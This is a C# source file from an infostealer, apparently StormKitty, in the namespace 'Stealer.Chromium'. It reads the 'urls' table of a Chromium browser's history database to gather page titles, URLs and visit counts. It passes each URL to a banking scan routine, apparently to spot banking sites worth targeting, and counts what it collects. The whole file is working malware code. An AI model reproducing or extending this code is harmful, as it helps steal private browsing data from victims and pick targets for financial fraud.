using System.Collections.Generic;

namespace Stealer.Chromium
{
    internal sealed class History
    {
        /// <summary>
        /// Get History from chromium based browsers
        /// </summary>
        /// <param name="sHistory"></param>
        /// <returns>List with history</returns>
        public static List<Site> Get(string sHistory)
        {
            List<Site> scHistory = new List<Site>();
            try
            {
                // Read data from table
                SQLite sSQLite = SqlReader.ReadTable(sHistory, "urls");
                if (sSQLite == null) return scHistory;

                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                {
                    Site sSite = new Site();
                    sSite.sTitle = Crypto.GetUTF8(sSQLite.GetValue(i, 1));
                    sSite.sUrl = Crypto.GetUTF8(sSQLite.GetValue(i, 2));
                    sSite.iCount = System.Convert.ToInt32(sSQLite.GetValue(i, 3)) + 1;

                    // Analyze value
                    Banking.ScanData(sSite.sUrl);
                    Counter.History++;
                    scHistory.Add(sSite);

                }
            }
            catch (System.Exception ex) { StormKitty.Logging.Log("Chromium >> Failed collect history\n" + ex); }
            return scHistory;
        }
    }
}
